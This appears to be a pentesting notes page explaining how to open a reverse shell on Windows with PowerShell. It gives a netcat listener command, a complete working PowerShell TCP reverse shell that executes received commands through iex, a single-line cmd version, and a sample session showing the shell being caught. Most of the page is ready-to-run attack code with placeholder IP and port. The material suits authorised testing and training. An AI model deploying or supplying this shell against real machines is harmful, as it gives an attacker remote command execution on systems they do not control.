---
description: Creating reverse shells with PowerShell
---

# PowerShell

PowerShell is a handy tool to start reverse shells on Windows machines (particularly due to the tool's large install base across Windows machines).

## Basic Reverse Shell

### Attacker Machine

The attacker would first want to start a listener on their machine. This can be done on any OS but for this example assume the attacker is on a Kali machine.

```bash
kali@kali:~$ sudo nc -lvnp {PORT}
```

### Target Machine

The attacker would then have to arrange for the following PowerShell one-liner to be executed on the target machine. This would prompt the target to "reach out" to the listener thus allowing system control. Replace `{IP}` and `{PORT}` with the IP address and the port number, respectively, of the listener (attacker machine).&#x20;

```powershell
$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

<table><thead><tr><th width="249">Component</th><th>Description</th></tr></thead><tbody><tr><td><code>$client</code></td><td>Variable (<code>System.Net.Sockets.TCPClient</code> class).<br><br>Declared with the <code>{IP}</code> and <code>{PORT}</code> of the listener substituted.<br><br>E.g. for a listener at <code>10.0.0.2:443</code> this object would be declared <code>System.Net.Sockets.TCPClient('10.0.0.2', 443)</code></td></tr><tr><td><code>iex</code></td><td>Alias for the <code>Invoke-Expression</code> cmdlet that runs any string it receives as a command and the results of the command are then redirected and sent back via the data stream.</td></tr></tbody></table>



Note that in the example the "one-liner" was broken across multiple lines for readability but it can be combined into a single line command that would be run at the command prompt (`cmd.exe`).

{% code overflow="wrap" %}
```shell
C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
{% endcode %}

* Note: `{IP}` and `{PORT}` must be substituted for the listener's IP and port values

### Shell Operation

After the shell is started the attacker will receive a basic PowerShell command prompt inside the reverse shell listener.

#### Example

Showing the appearance of an attacker using a listener at `10.11.0.4:443` to catch a reverse shell from a machine at `10.11.0.22`.

```bash
kali@kali:~$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63515

PS C:\Users\offsec>
```
